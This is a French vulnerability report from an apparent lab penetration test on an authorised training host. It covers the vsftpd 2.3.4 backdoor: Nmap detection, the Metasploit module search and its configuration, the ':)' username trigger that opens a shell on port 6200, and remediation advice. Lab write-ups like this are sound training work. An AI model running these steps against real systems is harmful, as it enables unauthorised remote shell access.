# Fiche Vulnérabilité N°01 — FTP (vsftpd 2.3.4)

## 1. Contexte et Identification
- **Service cible** : FTP (vsftpd)
- **Port d'écoute** : `21/tcp`
- **Version détectée** : `vsftpd 2.3.4`
- **Référence CVE** : `CVE-2011-2523`
- **Score CVSS v3** : `9.8 (Critique)` — Vecteur : `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Cible autorisée** : ESGIS VulnBox (`10.1.0.1`)

---

## 2. Démarche Méthodologique & Observations

### A. Détection initiale (Nmap)
Le scan réseau des versions (`reports/nmap-services.txt`) a mis en évidence le service suivant sur le port standard :
```text
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
```

### B. Recherche du module sous Metasploit
Conformément aux bonnes pratiques, la recherche du module correspondant a été effectuée directement dans `msfconsole` :
```text
msf6 > search vsftpd 2.3.4

Matching Modules
================
   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

### C. Analyse technique du module (`info`)
La commande `info exploit/unix/ftp/vsftpd_234_backdoor` détaille l'origine de la faille :
- **Historique** : Entre le 30 juin et le 3 juillet 2011, l'archive officielle `vsftpd-2.3.4.tar.gz` sur le serveur maître a été compromise par un tiers inconnu pour y injecter une porte dérobée (*backdoor*).
- **Fonctionnement** : Lorsqu'un client FTP transmet un identifiant se terminant par le motif `:)` (ex: `user toto:)`), le code malveillant déclenche une écoute distante d'un shell interactif sur le port TCP `6200`.

### D. Chargement et paramétrage
```text
msf6 > use 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.1.0.1
RHOSTS => 10.1.0.1
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

---

## 3. Preuves Réelles

### Capture d'écran — Configuration des options dans Metasploit
![Configuration du module vsftpd 2.3.4](../../screenshots/04-vulnerabilites/vuln-01-exec.png)

### Preuve technique / PoC
*Emplacement réservé à la confirmation du résultat de la commande `check` ou `exploit` sur 10.1.0.1 :*
- `screenshots/05-resultats/vuln-01-poc.png` *(En attente du test autorisé)*

---

## 4. Mesures Correctives et Remédiation

- **Mise à jour immédiate** : Remplacer `vsftpd 2.3.4` par une version maintenue et saine (les versions officielles actuelles sont nettoyées de tout code malveillant).
- **Vérification d'intégrité** : Valider systématiquement l'empreinte cryptographique (SHA256 / signature GPG) des paquets et sources téléchargés avant déploiement.
- **Principe de moindre privilège** : Si l'accès FTP anonyme n'est pas strictement requis, désactiver le service ou migrer vers un protocole sécurisé chiffré (SFTP via SSH sur le port 22 ou FTPS).
- **Filtrage réseau & Pare-feu** :
  - Restreindre l'exposition du port `21` aux seuls réseaux d'administration.
  - Bloquer au niveau du pare-feu tout trafic sortant ou entrant anormal sur les ports non standards (notamment le port `6200/tcp`).

---
**Statut actuel** : ⏳ *Module sélectionné, paramétré et prêt pour validation*
